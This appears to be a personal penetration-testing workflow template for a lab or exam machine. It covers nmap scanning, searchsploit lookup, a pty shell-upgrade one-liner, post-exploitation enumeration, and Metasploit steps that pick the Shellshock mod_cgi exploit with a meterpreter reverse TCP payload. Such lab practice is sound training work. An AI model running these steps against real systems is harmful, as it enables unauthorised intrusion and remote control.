# active, flow

## Summary

+ the full nmap scan took 1666.20 seconds (27 minutes), in the exam, find web server first.

## prev enum

```sh
sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- 10.129.96.185
  # rename-tab
sudo vim /etc/hosts
```

## searchsploit

```sh
search keywords
searchsploit keywords
```

```sh
cdee
cp /usr/share/exploitdb/exploits/example ~/assets/example/temp.php
cda
```

## example-vector

## interactive shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
  # C-z to background the shell
stty raw -echo; fg
```

## post enum

```sh
ps aux
sudo -l
```

## privilege escalation

```sh
```

## msf

```msfconsole
msf> search example
  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
msf> use 2
msf> show advanced
msf> show options
msf> set RHOSTS example
msf> ...

msf> show payloads
  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
msf> set payload 14

msf> run -j
  # meterpreter user shell
```
